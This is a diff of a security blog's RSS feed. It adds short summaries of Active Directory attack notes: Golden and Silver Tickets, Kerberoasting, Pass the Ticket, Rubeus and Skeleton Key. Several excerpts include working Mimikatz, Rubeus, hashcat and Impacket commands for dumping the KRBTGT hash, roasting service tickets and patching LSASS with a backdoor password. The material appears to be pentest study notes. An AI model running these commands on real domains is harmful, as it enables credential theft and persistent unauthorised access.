@@ -22,11 +22,32 @@
       <description>lastLogon vs lastLogonTimestamp lastLogon The lastLogon attribute contains a Windows FileTime representation of the last time a domain controller successfully authenticated the user. It is the granddaddy of user logon metadata, having been around since the first version Active Directory.&#xA;Using the PowerShell command below, you can retrieve the last logon time and other user properties on a domain controller:&#xA;1 Get-ADUser -Filter * -Properties lastLogon | Select samaccountname,@{Name=&amp;#34;lastLogon&amp;#34;;Expression={[datetime]::FromFileTime($_.&amp;#39;lastLogon&amp;#39;)}} The LastLogon attribute is updated every time a domain controller successfully processes a logon request, but it is not a replicated attribute.</description>
     </item>
     <item>
+      <title>Golden Ticket</title>
+      <link>https://kdbed.github.io/posts/golden_ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/golden_ticket/</guid>
+      <description>Golden Ticket A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the KRBTGT account’s NTLM hash. Once created, it can be used to impersonate any user in the domain, including domain admins, and grants unlimited access to services in the domain.&#xA;Overview Forged TGT signed with the KRBTGT hash Bypasses domain authentication controls Can impersonate any user in the domain Prerequisites SYSTEM or Domain Admin privileges on a domain-joined machine Access to the NTLM hash of the KRBTGT account Knowledge of: Domain SID Domain name (Optional) actual usernames Key Concepts KRBTGT account: Used by KDC to sign/encrypt TGTs SID: Used to tie forged ticket to domain TGT: Ticket Granting Ticket (used to request service tickets) Mimikatz Commands Dump KRBTGT Hash mimikatz # privilege::debug mimikatz # lsadump::lsa /inject /name:krbtgt Look for: Hash NTLM: a2c0b1f65a098dc5b3e3479e9d88cb5e</description>
+    </item>
+    <item>
+      <title>Kerberoasting</title>
+      <link>https://kdbed.github.io/posts/kerberoasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/kerberoasting/</guid>
+      <description>Kerberoasting Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.&#xA;Rubeus 1 Rubeus.exe kerberoast Then crack the hashes with hashcat&#xA;1 hashcat -m 13100 -a 0 hash.txt Pass.txt Impacket 1 sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.239.179 -request </description>
+    </item>
+    <item>
       <title>NTLM Authentication</title>
       <link>https://kdbed.github.io/posts/ntlm_authentication/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://kdbed.github.io/posts/ntlm_authentication/</guid>
       <description>NTLM Authentication Process I enter my username and password on my local computer. My computer runs the password I typed through the standard hashing algorithm used by both client machines like mine and the domain controllers (DCs) that provide authentication and authorization services. That gives it my password hash, which it will use in Step 5. My machine sends the nearest DC a logon request, which includes my username. The DC sends back a random number, which is known as a logon challenge.</description>
+    </item>
+    <item>
+      <title>Pass the Ticket (PtT) Attack</title>
+      <link>https://kdbed.github.io/posts/pass_the_ticket_ptt_attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/pass_the_ticket_ptt_attack/</guid>
+      <description>Pass the Ticket Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes.</description>
     </item>
     <item>
       <title>Pentest - Active Directory</title>
@@ -55,13 +76,6 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://kdbed.github.io/posts/pentest_active_directory_sid_history_injection/</guid>
       <description>SentinelOne&#xA;ADSecurity&#xA;MITRE</description>
-    </item>
-    <item>
-      <title>Pentest - Active Directory - Skeleton Key</title>
-      <link>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</guid>
-      <description>hacktricks&#xA;netwrix</description>
     </item>
     <item>
       <title>Pentest - BloodHound</title>
@@ -97,6 +111,27 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://kdbed.github.io/posts/python_visualize_active_directory_data/</guid>
       <description>Pandas to plot AD Data 1 2 3 4 5 6 7 8 9 import pandas import matplotlib.pyplot as plt from sqlalchemy import create_engin engine = create_engine(&amp;#34;activedirectory:///?User=cn=Bob F,ou=Employees,dc=Domain&amp;amp;Password=bob123&amp;amp;Server=10.0.1.2&amp;amp;Port=389&amp;#34;) df = pandas.read_sql(&amp;#34;SELECT Id, LogonCount FROM User WHERE CN = &amp;#39;Administrator&amp;#39;&amp;#34;, engine) df.plot(kind=&amp;#34;bar&amp;#34;, x=&amp;#34;Id&amp;#34;, y=&amp;#34;LogonCount&amp;#34;) plt.show() From: cdata.com</description>
+    </item>
+    <item>
+      <title>Rubeus</title>
+      <link>https://kdbed.github.io/posts/rubeus/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/rubeus/</guid>
+      <description>Rubeus Harvesting and Brute-forcing tickets Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.&#xA;GhostPack&#xA;Harvest TGTs every 30 seconds: Rubeus.exe harvest /interval:30 Password spray against found users and provide a .</description>
+    </item>
+    <item>
+      <title>Silver Ticket</title>
+      <link>https://kdbed.github.io/posts/silver_ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/silver_ticket/</guid>
+      <description>Silver Ticket A Silver Ticket is a forged Kerberos Service Ticket (TGS) that allows access to a specific service without contacting a Domain Controller. It is created using the NTLM hash of the target service account, often a computer account (e.g., `HOST/`, `HTTP/`).&#xA;Overview Forged TGS for a specific service Does not require communication with a Domain Controller Uses the service account&amp;rsquo;s NTLM hash, not KRBTGT Lower privilege, more stealthy than a Golden Ticket Prerequisites SYSTEM or Administrator access on a domain-joined machine Knowledge of: NTLM hash of the target service account (e.</description>
+    </item>
+    <item>
+      <title>Skeleton Key</title>
+      <link>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</guid>
+      <description>Skeleton Key A Skeleton Key is a stealthy backdoor attack where Mimikatz injects a patch into LSASS memory on a Domain Controller. This allows an attacker to authenticate as any domain user using a master password, in addition to their real credentials.&#xA;Overview Injects code into `lsass.exe` on a Domain Controller Leaves legitimate logins untouched Adds a universal password valid for all domain accounts Memory-resident: disappears on reboot Prerequisites SYSTEM-level access on a Domain Controller Ability to execute code and patch LSASS memory Mimikatz or similar tool Key Concepts LSASS: Local Security Authority Subsystem Service; handles authentication Patch: Modifies Kerberos/NTLM authentication providers in memory Backdoor password: An additional universal password accepted for all users Mimikatz Commands Load Skeleton Key Patch mimikatz # privilege::debug mimikatz # misc::skeleton Default password: mimikatz</description>
     </item>
   </channel>
 </rss>
